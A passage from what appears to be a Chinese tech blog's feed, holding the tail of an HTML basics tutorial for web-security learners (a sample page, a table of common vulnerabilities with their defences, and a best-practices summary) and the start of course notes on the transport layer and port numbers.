&#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.security-table</span> <span class="selector-tag">th</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#f2f2f2</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.high-risk</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#e74c3c</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.medium-risk</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#f39c12</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.low-risk</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#2ecc71</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.code-block</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="number">#2d2d2d</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#f8f8f2</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">15px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">overflow-x</span>: auto;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: monospace;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">footer</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-top</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="number">#2c3e50</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">header</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>WEB安全学习平台<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>HTML基础教程 - 安全渗透必备技能<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;section&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">&quot;introduction&quot;</span>&gt;</span>一、HTML基础概述<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>HTML（超文本标记语言）是构建Web页面的基础，是WEB安全人员必须掌握的核心技能之一。掌握HTML有助于理解网页结构、识别潜在安全漏洞（如XSS、CSRF等）。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">            <span class="tag">&lt;<span class="name">h3</span>&gt;</span>HTML文档结构<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pre</span> <span class="attr">class</span>=<span class="string">&quot;code-block&quot;</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;lt;</span>!DOCTYPE html<span class="symbol">&amp;gt;</span></span><br><span class="line"><span class="symbol">&amp;lt;</span>html lang=&quot;zh-CN&quot;<span class="symbol">&amp;gt;</span></span><br><span class="line"><span class="symbol">&amp;lt;</span>head<span class="symbol">&amp;gt;</span></span><br><span class="line">    <span class="symbol">&amp;lt;</span>meta charset=&quot;UTF-8&quot;<span class="symbol">&amp;gt;</span></span><br><span class="line">    <span class="symbol">&amp;lt;</span>title<span class="symbol">&amp;gt;</span>示例页面<span class="symbol">&amp;lt;</span>/title<span class="symbol">&amp;gt;</span></span><br><span class="line"><span class="symbol">&amp;lt;</span>/head<span class="symbol">&amp;gt;</span></span><br><span class="line"><span class="symbol">&amp;lt;</span>body<span class="symbol">&amp;gt;</span></span><br><span class="line">    <span class="symbol">&amp;lt;</span>!-- 页面内容 --<span class="symbol">&amp;gt;</span></span><br><span class="line"><span class="symbol">&amp;lt;</span>/body<span class="symbol">&amp;gt;</span></span><br><span class="line"><span class="symbol">&amp;lt;</span>/html<span class="symbol">&amp;gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;section&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">&quot;form-example&quot;</span>&gt;</span>二、表单安全示例<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>表单是WEB应用中常见漏洞来源，了解表单结构有助于识别安全问题。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">            <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/submit&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;username&quot;</span>&gt;</span>用户名:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入用户名&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                </span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;password&quot;</span>&gt;</span>密码:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">minlength</span>=<span class="string">&quot;8&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                </span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>上传头像:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;avatar&quot;</span> <span class="attr">accept</span>=<span class="string">&quot;image/*&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                </span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;email&quot;</span>&gt;</span>邮箱:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">id</span>=<span class="string">&quot;email&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                </span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;color&quot;</span>&gt;</span>选择颜色:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;color&quot;</span> <span class="attr">id</span>=<span class="string">&quot;color&quot;</span> <span class="attr">name</span>=<span class="string">&quot;color&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#ff0000&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                </span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交表单&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf_token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;abc123&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>安全提示：<span class="tag">&lt;/<span class="name">strong</span>&gt;</span>表单应使用HTTPS传输，对用户输入进行严格验证，防止XSS和SQL注入攻击。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;section&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">&quot;table-example&quot;</span>&gt;</span>三、数据表格示例<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>表格常用于展示结构化数据，安全人员需理解其结构以识别潜在漏洞。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">            <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">&quot;security-table&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">caption</span>&gt;</span>常见Web安全漏洞类型<span class="tag">&lt;/<span class="name">caption</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>漏洞类型<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>危害等级<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>检测方法<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>防御措施<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span>&gt;</span>XSS（跨站脚本）<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">&quot;high-risk&quot;</span>&gt;</span>高<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span>&gt;</span>输入验证、输出编码检查<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span>&gt;</span>对用户输入进行过滤，对输出进行HTML编码<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span>&gt;</span>SQL注入<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">&quot;high-risk&quot;</span>&gt;</span>高<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span>&gt;</span>SQL语句参数化查询检查<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span>&gt;</span>使用预编译语句、ORM框架<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span>&gt;</span>CSRF（跨站请求伪造）<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">&quot;medium-risk&quot;</span>&gt;</span>中<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span>&gt;</span>检查Referer头、CSRF令牌验证<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span>&gt;</span>实施CSRF令牌机制、SameSite Cookie属性<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span>&gt;</span>文件上传漏洞<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">&quot;high-risk&quot;</span>&gt;</span>高<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span>&gt;</span>检查文件类型验证<span class="tag">&lt;<span class="name">br</span>&gt;</span>查看文件存储路径是否可预测<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span>&gt;</span>限制文件类型<span class="tag">&lt;<span class="name">br</span>&gt;</span>重命名上传文件<span class="tag">&lt;<span class="name">br</span>&gt;</span>将上传文件存储在非Web可访问目录<span class="tag">&lt;<span class="name">br</span>&gt;</span>检查文件内容<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;section&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">&quot;resources&quot;</span>&gt;</span>四、学习资源<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>以下是一些WEB安全学习资源：<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://owasp.org&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;noopener noreferrer&quot;</span>&gt;</span>OWASP（开放Web应用安全项目）<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://portswigger.net&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;noopener noreferrer&quot;</span>&gt;</span>PortSwigger（Burp Suite开发者）<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.freebuf.com&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;noopener noreferrer&quot;</span>&gt;</span>FreeBuf（安全资讯平台）<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">            <span class="tag">&lt;<span class="name">h3</span>&gt;</span>相关视频教程<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">iframe</span> </span></span><br><span class="line"><span class="tag">                <span class="attr">src</span>=<span class="string">&quot;https://www.youtube.com/embed/dQw4w9WgXcQ&quot;</span> </span></span><br><span class="line"><span class="tag">                <span class="attr">width</span>=<span class="string">&quot;560&quot;</span> </span></span><br><span class="line"><span class="tag">                <span class="attr">height</span>=<span class="string">&quot;315&quot;</span> </span></span><br><span class="line"><span class="tag">                <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span> </span></span><br><span class="line"><span class="tag">                <span class="attr">allow</span>=<span class="string">&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot;</span> </span></span><br><span class="line"><span class="tag">                <span class="attr">allowfullscreen</span></span></span><br><span class="line"><span class="tag">                <span class="attr">title</span>=<span class="string">&quot;WEB安全入门视频&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">sandbox</span>=<span class="string">&quot;allow-same-origin allow-scripts allow-popups&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;section&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">&quot;contact&quot;</span>&gt;</span>五、联系我们<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>有任何问题欢迎通过以下方式联系我们：<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>邮箱：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;mailto:support@websec.com&quot;</span>&gt;</span>support@websec.com<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>电话：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;tel:+8613800138000&quot;</span>&gt;</span>138-0013-8000<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">            <span class="tag">&lt;<span class="name">h3</span>&gt;</span>反馈表单<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/feedback&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;feedback&quot;</span>&gt;</span>您的意见:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">&quot;feedback&quot;</span> <span class="attr">name</span>=<span class="string">&quot;feedback&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;4&quot;</span> <span class="attr">required</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交反馈&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">footer</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="symbol">&amp;copy;</span> 2025 WEB安全学习平台 | 本页面使用HTML5标准构建<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#introduction&quot;</span>&gt;</span>返回顶部<span class="tag">&lt;/<span class="name">a</span>&gt;</span> | <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#form-example&quot;</span>&gt;</span>表单示例<span class="tag">&lt;/<span class="name">a</span>&gt;</span> | <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#table-example&quot;</span>&gt;</span>表格示例<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="安全最佳实践总结"><a href="#安全最佳实践总结" class="headerlink" title="安全最佳实践总结"></a>安全最佳实践总结</h2><ol>
<li><strong>字符编码</strong>：始终使用UTF-8编码，避免编码转换漏洞</li>
<li><strong>表单安全</strong>：<ul>
<li>使用POST方法提交敏感数据</li>
<li>对用户输入进行严格验证和过滤</li>
<li>使用CSRF令牌防止跨站请求伪造</li>
<li>限制文件上传类型和大小</li>
</ul>
</li>
<li><strong>内容安全策略（CSP）</strong>：<ul>
<li>通过<code>Content-Security-Policy</code>头限制可执行的脚本来源</li>
<li>防止XSS攻击</li>
</ul>
</li>
<li><strong>X-Frame-Options</strong>：<ul>
<li>设置为<code>DENY</code>或<code>SAMEORIGIN</code>防止点击劫持</li>
</ul>
</li>
<li><strong>iframe安全</strong>：<ul>
<li>使用<code>sandbox</code>属性限制iframe功能</li>
<li>避免嵌入不可信的第三方内容</li>
</ul>
</li>
<li><strong>链接安全</strong>：<ul>
<li>外部链接使用<code>target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;</code></li>
<li>防止通过<code>window.opener</code>访问原页面</li>
</ul>
</li>
<li><strong>表格使用</strong>：<ul>
<li>仅用于展示结构化数据，不用于页面布局</li>
<li>为表格添加适当的标题和描述</li>
<li>使用CSS控制样式，而非HTML属性</li>
</ul>
</li>
</ol>
<blockquote>
<p><strong>重要提醒</strong>：HTML是Web安全的基础，掌握HTML标签的正确使用和安全配置是识别和防御各类Web安全漏洞的前提。在实际应用中，应结合后端安全措施，共同构建安全的Web应用。</p>
</blockquote>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>Web</category>
        <category>前端&amp;后端基础</category>
      </categories>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title>第 5 章 传输层</title>
    <url>/2025/12/05/%E4%BC%A0%E8%BE%93%E5%B1%82/</url>
    <content><![CDATA[<h2 id="5-1-传输层提供的服务"><a href="#5-1-传输层提供的服务" class="headerlink" title="5.1   传输层提供的服务"></a>5.1   传输层提供的服务</h2><h3 id="5-1-1-传输层的功能"><a href="#5-1-1-传输层的功能" class="headerlink" title="5.1.1   传输层的功能"></a>5.1.1   传输层的功能</h3><ul>
<li>基本概念<ul>
<li>位于网络层之上、应用层之下</li>
<li>为运行在不同主机上的进程之间提供逻辑通信</li>
<li>面向通信部分的最高层，用户功能中的最低层</li>
<li>即使网络层协议不可靠，也能为应用程序提供可靠服务</li>
</ul>
</li>
<li>通信特点<ul>
<li>只有主机协议栈才有传输层</li>
<li>路由器转发分组只用到下三层功能</li>
<li>传输层只存在于通信子网以外的主机中</li>
</ul>
</li>
<li>主要功能<ul>
<li>应用进程之间的逻辑通信<ul>
<li>通信的真正端点是主机中的进程</li>
<li>端到端的逻辑通信</li>
</ul>
</li>
<li>复用和分用<ul>
<li>复用：不同应用进程使用同一传输协议</li>
<li>分用：正确交付数据到目的应用进程</li>
</ul>
</li>
<li>差错检测<ul>
<li>检测报文首部和数据部分</li>
<li>TCP：出错则要求重发</li>
<li>UDP：出错则直接丢弃</li>
<li>网络层只检验IP首部</li>
</ul>
</li>
<li>提供两种传输协议<ul>
<li>面向连接的TCP<ul>
<li>提供可靠的全双工信道</li>
</ul>
</li>
<li>无连接的UDP<ul>
<li>提供不可靠信道</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="5-1-2-传输层的寻址与端口"><a href="#5-1-2-传输层的寻址与端口" class="headerlink" title="5.1.2   传输层的寻址与端口"></a>5.1.2   传输层的寻址与端口</h3><ul>
<li>①. 端口的作用<ul>
<li><p>端口能让应用层的各种进程将其数据通过端口向下交付给传输层</p>
</li>
<li><p>让传输层知道应当将其报文段中的数据向上通过端口交付给应用层相应的进程</p>
</li>
<li><p>端口在传输层的作用类似于IP地址在网络层的作用</p>
<ul>
<li>IP地址标识的是主机</li>
<li>端口标识的是主机中的应用进程</li>
</ul>
</li>
<li><p>各层服务访问点：</p>
<ul>
<li>数据链路层：帧的”类型”字段</li>
<li>网络层：IP数据报的”协议”字段</li>
<li>传输层：”端口号”字段</li>
<li>应用层：”用户界面”</li>
</ul>
</li>
<li><p>协议端口与硬件端口的区别</p>
<ul>
<li>协议端口是软件端口</li>
<li>硬件端口是不同硬件设备交互的接口</li>
<li>软件端口是应用层协议进程与传输实体交互的地址</li>
<li>传输层使用软件端口</li>
</ul>
</li>
<li><p>②. 端口号</p>
<ul>
<li>应用进程通过端口号进行标识</li>
<li>端口号长度为16比特，可表示65536(2¹⁶)个不同端口号</li>
<li>端口号只具有本地意义<ul>
<li>只标识本计算机应用层中的各进程</li>
<li>不同计算机的相同端口号没有联系</li>
</ul>
</li>
<li>端口号分类：<ul>
<li>服务器端使用的端口号<ul>
<li>熟知端口号(0～1023)<ul>
<li>IANA指派给TCP&#x2F;IP重要应用程序</li>
<li>常用熟知端口号：<ul>
<li>FTP: 21</li>
<li>TELNET: 23</li>
<li>SMTP: 25</li>
<li>DNS: 53</li>
<li>TFTP: 69</li>
<li>HTTP: 80</li>
<li>SNMP: 161</li>
</ul>
</li>
</ul>
</li>
<li>登记端口号(1024～49151)<ul>
<li>供没有熟知端口号的应用程序使用</li>
<li>必须在IANA登记以防止重复</li>
</ul>
</li>
</ul>
</li>
<li>客户端使用的端口号(49152～65535)<ul>
<li>也称短暂端口号</li>
